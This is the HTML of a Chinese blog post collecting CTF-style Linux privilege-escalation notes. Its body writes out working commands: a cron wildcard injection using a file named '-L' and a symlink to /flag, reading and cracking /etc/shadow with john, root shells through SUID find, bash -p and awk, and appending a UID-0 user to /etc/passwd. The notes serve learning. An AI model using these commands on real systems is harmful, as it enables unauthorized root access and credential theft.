@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="提权提权做的少，感觉真碰上了只觉得sudo熟悉，多多看下其他可行可考的方法   定时任务定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 &#x2F;etc&#x2F;cronta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux下提权(持续)">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="提权提权做的少，感觉真碰上了只觉得sudo熟悉，多多看下其他可行可考的方法   定时任务定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 &#x2F;etc&#x2F;cronta">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-26T08:57:33.000Z">
+<meta property="article:modified_time" content="2025-10-26T10:26:49.473Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>linux下提权(持续)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&text=linux下提权(持续)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&is_video=false&description=linux下提权(持续)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=linux下提权(持续)&body=Check out this article: https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&name=linux下提权(持续)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&t=linux下提权(持续)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">定时任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">软链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">文件利用提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shadow%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">shadow文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E8%AF%BB"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">可读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E5%86%99"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">可写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%9D%83%E9%99%90"><span class="toc-number">1.3.</span> <span class="toc-text">suid权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEsuid"><span class="toc-number">1.3.1.</span> <span class="toc-text">查找suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8B%A5%E5%B9%B2suid%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">若干suid程序的提权方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#find"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cp-mv"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">cp&#x2F;mv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bash"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#awk"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">awk</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A5%87%E6%80%AA%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">其他奇怪的提权方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.5.</span> <span class="toc-text">结语</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.5.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        linux下提权(持续)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-26T08:57:33.000Z" class="dt-published" itemprop="datePublished">2025-10-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/linux%E6%8F%90%E6%9D%83/">linux提权</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>提权做的少，感觉真碰上了只觉得sudo熟悉，多多看下其他可行可考的方法  </p>
+<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。<br>利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。<br>cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。<br>cron 服务（守护进程）在系统后台运行，并且会持续地检查 &#x2F;etc&#x2F;crontab 文件和 &#x2F;etc&#x2F;cron.*&#x2F; 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录。<br><code>crontab -l</code> <code>cat /etc/crontab``ls -l /etc/cron*</code>查看定时任务  </p>
+<h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><p>湾区杯有一道定时任务提权题目  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">cd /var/www/html/</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    cp -P * /var/www/html/backup/</span><br><span class="line">    chmod 755 -R /var/www/html/backup/</span><br><span class="line">    sleep 15s</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></div>
+<p>注意几个点 </p>
+<ul>
+<li>这个脚本是root权限，可以复制flag等文件</li>
+<li>这里用的是cp复制，而*属于我们可以注入的地方</li>
+<li>chmod 755 -R,说明这个目录是可读的<br>我们需要构造一个名称”-L”的文件，这要可以复制软链接指向的文件<br>然后我们再建立一个软链接指向&#x2F;flag<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch -- &quot;-L&quot;</span><br><span class="line">ln -s /flag link</span><br></pre></td></tr></table></figure></div>
+等待定时任务执行即可读取flag</li>
+</ul>
+<h2 id="文件利用提权"><a href="#文件利用提权" class="headerlink" title="文件利用提权"></a>文件利用提权</h2><h3 id="shadow文件"><a href="#shadow文件" class="headerlink" title="shadow文件"></a>shadow文件</h3><h4 id="可读"><a href="#可读" class="headerlink" title="可读"></a>可读</h4><p><code>ls -liah /etc/shadow</code><br>枚举shadow文件，发现全局可读，存在利用条件<br>提取出hash用户  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow | grep &#x27;:\$&#x27;</span><br><span class="line">将获得的hash存入文件里 </span><br><span class="line">利用john进行破解</span><br><span class="line">sudo john shadow_root --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure></div>
+<p>得到root密码，登录系统</p>
+<h4 id="可写"><a href="#可写" class="headerlink" title="可写"></a>可写</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkpasswd -m sha-512 123456</span><br><span class="line">仿造root用户的hash替换保存</span><br><span class="line">回到靶机进行替换即可</span><br></pre></td></tr></table></figure></div>
+<p>即可登录获取权限<br>不难，但是得知道</p>
+<h2 id="suid权限"><a href="#suid权限" class="headerlink" title="suid权限"></a>suid权限</h2><p>suid允许普通用户在无需切换到超级用户的情况下以root身份执行命令，这样本来一个是test的用户，如果当前环境有一个base32具备sudo权限，可以以root身份执行。<br>那么可以执行<code>base32 /flag</code>读取高权限的文件<br>这毫无疑问，是提权学习的重点</p>
+<h3 id="查找suid"><a href="#查找suid" class="headerlink" title="查找suid"></a>查找suid</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line">-perm 表示搜索随后的权限</span><br><span class="line">-u = s表示查找root用户拥有的文件</span><br><span class="line">-type表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt;表示重定向</span><br><span class="line">/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure></div>
+
+<p>找到这些可执行程序之后，就可以查找是否有suid权限<code>ls -al /usr/bin/su</code><br>如果有，类似base,rev,nl可以直接读<code>/flag</code><br>也存在一些出题人，重写了类如rev，这时候需要你base64把二进制文件弄下来进行逆向<br>这里推荐一个网站，很方便查找<code>https://gtfobins.github.io/</code></p>
+<h3 id="若干suid程序的提权方法"><a href="#若干suid程序的提权方法" class="headerlink" title="若干suid程序的提权方法"></a>若干suid程序的提权方法</h3><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find 具有suid权限的filename -exec whoami \; -quit</span><br><span class="line">#root</span><br><span class="line">find 具有suid权限的filename -exec /bin/sh -p \; -quit</span><br><span class="line">#whoami</span><br><span class="line">#root</span><br><span class="line">还有一种差不多的提权方法</span><br><span class="line">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span><br><span class="line">touch 1.txt #创建1.txt</span><br><span class="line">/usr/bin/find 1.txt -exec whoami \;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h4><p>据我了解cp和mv覆盖方式是差不多的，这里以cp进行详解</p>
+<p>主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权，这里我看了一下网上都没有写主要步骤的，都是搪塞了过去，我这里研究了一下原理，写一下我的cp覆盖过程</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">#qszd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">openssl passwd -1 -salt test testaaa</span><br><span class="line">echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd</span><br><span class="line">echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd</span><br><span class="line">su - test</span><br><span class="line">#root</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><p>bash命令有的靶机是设置了suid权限的，有的没有设置suid权限</p>
+<p>我的靶机没有设置suid权限，这里就口头描述一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">#uid=1024(qsdz) gid=999(qsdz) groups=999(qsdz)</span><br><span class="line">bash -p</span><br><span class="line">#生成一个  bash-3.2#</span><br><span class="line">bash-3.2# id</span><br><span class="line">#uid=1024(qsdz) gid=999(qsdz) euid=0(root) groups=999(qsdz)</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>awk利用以下命令进入shell，其原理和上面的bash差不多</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br><span class="line">bash-3.2$ whoami</span><br><span class="line">#root</span><br></pre></td></tr></table></figure></div>
+
+<p>至于其他若干可执行命令，可自行在网站进行查询  </p>
+<h2 id="其他奇怪的提权方式"><a href="#其他奇怪的提权方式" class="headerlink" title="其他奇怪的提权方式"></a>其他奇怪的提权方式</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure></div>
+
+<p>这个命令可以查看当前用户使用过的历史命令</p>
+<p>有可能会得到root登录的密码</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>各式提权方式很多，但是等实际碰到了再做归纳</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.huangmj.com/17116743651246.html#5-sudo-awk">https://www.huangmj.com/17116743651246.html#5-sudo-awk</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung/articles/18421480">https://www.cnblogs.com/yuy0ung/articles/18421480</a><br><a target="_blank" rel="noopener" href="https://www.huangmj.com/17123057141312.html">https://www.huangmj.com/17123057141312.html</a><br><a target="_blank" rel="noopener" href="https://haslet007.cn/2025/03/27/suid%E6%8F%90%E6%9D%83sudo%E6%8F%90%E6%9D%83/">https://haslet007.cn/2025/03/27/suid%E6%8F%90%E6%9D%83sudo%E6%8F%90%E6%9D%83/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">定时任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">软链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">文件利用提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shadow%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">shadow文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E8%AF%BB"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">可读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E5%86%99"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">可写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%9D%83%E9%99%90"><span class="toc-number">1.3.</span> <span class="toc-text">suid权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEsuid"><span class="toc-number">1.3.1.</span> <span class="toc-text">查找suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8B%A5%E5%B9%B2suid%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">若干suid程序的提权方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#find"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cp-mv"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">cp&#x2F;mv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bash"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#awk"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">awk</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A5%87%E6%80%AA%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">其他奇怪的提权方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.5.</span> <span class="toc-text">结语</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.5.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&text=linux下提权(持续)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&is_video=false&description=linux下提权(持续)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
